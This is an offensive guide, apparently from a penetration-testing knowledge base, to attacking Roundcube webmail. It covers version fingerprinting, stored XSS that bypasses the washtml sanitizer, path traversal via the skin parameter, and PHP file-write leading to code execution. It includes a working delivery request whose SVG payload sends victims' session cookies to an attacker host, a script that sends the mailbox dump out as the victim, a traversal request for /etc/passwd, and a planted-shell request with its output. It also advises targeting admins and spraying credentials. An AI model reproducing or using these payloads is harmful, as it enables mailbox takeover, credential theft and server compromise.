---
title: "Roundcube: stored XSS in message rendering and file-write to PHP"
description: "Attacking Roundcube webmail: fingerprinting the build, stored cross-site scripting through the rcube_washtml HTML sanitizer (the style, SVG, and attribute bypasses) that fires when the victim opens a crafted message, skin and plugin path traversal, and the installto and plugin paths that write PHP under the webroot for code execution."
keywords:
  - roundcube xss
  - rcube_washtml bypass
  - roundcube path traversal
  - roundcube rce
  - stored xss email
---

# Roundcube

Roundcube is a PHP webmail client that renders HTML email in the browser after passing it through its own sanitizer, `rcube_washtml` ("washtml"). The entire high-value surface flows from that: if a construct survives washtml, the attacker-supplied script runs inside the victim's authenticated session the moment they open the message. Because delivery is just sending mail, exploitation needs no link click and no second factor. Alongside the rendering bugs, Roundcube's skin loader and plugin installer have repeatedly allowed path traversal and writing PHP under the webroot.

## Fingerprint first

Confirm the product and pin the exact build, because every washtml bypass is version-bound.

```bash
curl -sk 'https://<target>/?_task=login' -i | grep -iE 'set-cookie|location'
#   Set-Cookie: roundcube_sessid=...   confirms Roundcube
curl -sk https://<target>/CHANGELOG.md | head -n 5      # exact version on many installs
curl -sk https://<target>/program/resources/ -i         # 403/listing confirms layout
```

The markup also leaks the build in asset query strings (`program/js/app.min.js?s=<buildhash>`) and the skin name under `skins/`. The version selects which message-rendering bypass and which installer path are live, so record it before sending anything.

## Stored XSS through the HTML sanitizer

Roundcube displays an HTML message by parsing it, running `rcube_washtml` to strip scripting, and injecting the result into the message view. The sanitizer works by allow-listing tags and attributes and rewriting URLs, so every practical bug is a parser-differential: a construct the washtml parser reads differently from the browser that ultimately renders it. Historic live classes:

- **SVG event handlers and animation.** An `<svg>` subtree carrying an animation element whose event attribute washtml does not recognize (for example `onbegin` on `<animate>`, rather than the commonly stripped `onload`/`onerror`) passes the allow-list and fires on render with no user interaction.
- **Mutation XSS via foreign content.** washtml allow-lists `<svg>` and `<math>` subtrees, but the browser's foreign-content parsing re-interprets the markup after sanitization: a `<style>` or comment inside the subtree closes at a different point in the live DOM than washtml saw, smuggling a following element with an `onerror` handler past the filter.
- **CSS injection for exfiltration.** A surviving `style`/`<style>` cannot execute JavaScript in a current browser, but a `url()` in a `background` or `@font-face` still issues an attacker-controlled request when the message renders, confirming the mail was opened and enabling attribute-value exfiltration through conditional selectors.

Deliver it as an ordinary message. The payload is the message body; it executes when the target opens the mail:

```http
POST /?_task=mail&_action=send HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=x
Cookie: roundcube_sessid=<your-own-session>; roundcube_sessauth=<...>

--x
Content-Disposition: form-data; name="_to"

victim@target
--x
Content-Disposition: form-data; name="_subject"

Invoice
--x
Content-Disposition: form-data; name="_message"

<svg><animate onbegin="fetch('//attacker/x?c='+document.cookie)" attributeName=x dur=1s></svg>
--x--
```

You do not need Roundcube to send it; any SMTP path to the victim works, and the crafted HTML part is what matters. When the victim opens the message, washtml fails to neutralize the construct and the browser executes it in the `https://<target>` origin. A successful hit is visible as a request arriving at your collector carrying the victim's `roundcube_sessid`/`roundcube_sessauth` values.

Steal the session and you own the mailbox. The same payload, instead of exfiltrating the cookie, can drive the Roundcube AJAX API in-page to read folders and silently send as the victim:

```js
fetch('/?_task=mail&_action=send',{method:'POST',credentials:'include',
  body:new URLSearchParams({_to:'attacker@evil',_subject:'x',_message:dump})})
```

That is the follow-on that matters: script in the mailbox origin equals full read of every message and send-as from the victim's address, with no credential and no prompt.

## Skin and plugin path traversal

Roundcube loads UI templates by a `_skin`/template name and, in the installer and some plugins, composes a filesystem path from request input. Where that path is not confined, `../` sequences read files outside the skin directory:

```http
GET /?_task=settings&_action=edit-prefs&_skin=../../../../../../etc/passwd%00 HTTP/1.1
Host: target
Cookie: roundcube_sessid=<session>
```

A traversal that resolves to a readable config file returns the Roundcube `config/config.inc.php` (DB DSN, `des_key`) or system files in the response body; read the body to confirm the leak rather than relying on status codes alone. The DES key and DB credentials from that config are themselves escalation: the key signs the session and lets you forge or decrypt stored credentials.

## File write to PHP

The highest-impact Roundcube chains end in a PHP file under the webroot, giving OS code execution as the web user. Two recurring sources:

- **The plugin installer / `installto` path.** Installer and upgrade routines that write plugin files from request-controlled names allow planting a `.php` payload (or traversing out of the plugins directory) that is then requested directly.
- **A writable sink reached post-auth.** Features such as `enigma` (key import) and `markasjunk` (which can invoke a configured external command) take filenames or command fragments from preferences; where the value reaches a file write or a shell, a crafted preference turns a logged-in session into disk write or command execution.

Worked example, requesting the planted shell after a successful write:

```http
GET /plugins/enigma/home/.../shell.php?c=id HTTP/1.1
Host: target
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `www-data` response confirms execution as the web user. From there the Roundcube `config/config.inc.php` on disk hands you the IMAP/SMTP backend credentials and the DB, pivoting from a single mailbox to the whole mail store.

## Exploitation notes

- The rendering bugs are **client-side in the victim's session**: you gain exactly the victim's privileges, so target an admin or a user with onward access, and chain to send-as for lateral phishing from a trusted address.
- washtml bypasses are **tightly version-bound**. Pin the build from `CHANGELOG.md`/asset hashes first; a payload for one minor release is usually dead on the next.
- The file-write chains run as the **web user** and need a valid (often low-privilege) session; combine with the XSS to get that session, or with sprayed credentials.
- `config/config.inc.php` is the pivot: its `des_key` and DB/IMAP credentials convert mailbox access into backend access.

## Tools

- [roundcube/roundcubemail (source, to diff washtml between builds)](https://github.com/roundcube/roundcubemail)
- Burp Suite repeater for crafting and resending the multipart message body.

## References

- [SonarSource: Roundcube webmail security research](https://www.sonarsource.com/blog/)
- [roundcube/roundcubemail security advisories](https://github.com/roundcube/roundcubemail/security/advisories)
- [PortSwigger: reflected and stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
